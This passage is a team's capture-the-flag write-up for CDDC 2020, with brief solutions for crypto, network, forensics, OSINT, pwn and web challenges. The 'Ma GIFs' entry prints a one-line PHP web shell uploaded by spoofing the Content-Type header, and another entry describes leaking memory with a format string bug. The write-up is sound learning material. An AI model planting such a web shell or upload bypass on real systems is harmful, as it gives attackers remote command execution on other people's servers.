My teammate Ethan found out that the ciphertext was encrypted with a substitution  cipher. Use [Automated substitution cipher solver](https://quipqiup.com/) and group all capitalized letters to obtain flag.

### [Network-1] Baby Shark

Viewing the pcap in wireshark show us a bunch of HTTP traffic including images. Export objects and flag is found in one of the images.

Flag: `CDDC20{TLP_RED_EYES_ONLY}`

### [Network-2] Mama Shark

Also similar to the previous network challenge. Extracting the HTTP object and the flag can be found in a text file.

Flag: `CDDC20{JUST_GIVE_ME_TL:DR}`

### [Forensics-2] Shell History

Download the virtual machine and run the machine. The flag can be found in the .bashhistory in user home directory.

### [Pwn (Linux)-2] \(2^31\)-1

```bash
nc zer0.chall.cddc2020.nshc.sg 20002
```

My teammate Ethan mutiple 2^31-1 by 2 and able to get the program to print out 0 which results in the flag. 

### [Misc-2] ARGH

### [OSINT-3] Transparency is the Best

My teammate Jun Yan discovered the website `tt7ncdhj367dh8mu2pb6.unduplicitouscorp.tech` by using a internet tools to find subdomains, under this domain there is a `flag.tt7ncdhj367dh8mu2pb6.unduplicitouscorp.tech` which result in the flag.
[Subdomain Finder](https://borysek.eu/ct/)

### [RE (Windows)-1] Decompile Me (Unsolved)

Use tools such as [unpy2exe](https://github.com/matiasb/unpy2exe). Couldn't get it working.

### [Forensics-3] Top Secret

TopSecret is a .ad1 file, can be view in FTK Imager software and flag is hidden in a text file with lorem texts. 

### [Pwn (Linux)-3] Find Singapore Bug

FSB also known as Format String Bug, able to leak out flag by inputting many `%x` or `%c`. Swap Endianess to obtain the flag

Flag: `CDDC20{AAAABBBB-Oh~YouLeakedIt-CCCCDDDD}`

A Maxicode QR Code, invert the image and use online decoder

### Great Sphinx of Unduplicitous Corp (Unsolved)

### Ma GIFs

We were given a website where we can upload GIF

![Ma GIF Website](./Ma_GIF.png)

The website has File Upload Vulnerability, you are able to upload a simple backdoor code by modifying the Content-Type header.

![Ma GIF Upload](./Ma_GIF_2.png)

```bash
<?php echo "</pre>"; system($_GET['cmd']); ?>
```
After uploading the backdoor, we can execute our commands in the url.

### Secret Code (Unsolved)

Using Ghidra, a free and open source reverse engineering tool. It was able to reconstruct some of the source code back, however we were not sure on how to go on from here.

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  local_18 = 0;
  puts("         __                                     _           ");
